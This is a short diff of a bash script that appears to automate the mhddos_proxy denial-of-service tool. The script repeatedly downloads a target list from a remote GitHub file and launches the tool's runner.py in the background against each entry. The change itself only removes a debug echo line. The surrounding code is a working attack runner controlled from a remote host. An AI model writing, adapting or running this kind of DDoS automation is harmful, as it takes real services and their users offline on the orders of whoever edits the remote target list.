@@ -34,7 +34,6 @@ do
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-            echo -e $i": " $cmd_line $threads "--rpc 100" "-p 3600" "--debug\n"
             python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
       done
 sleep 15m
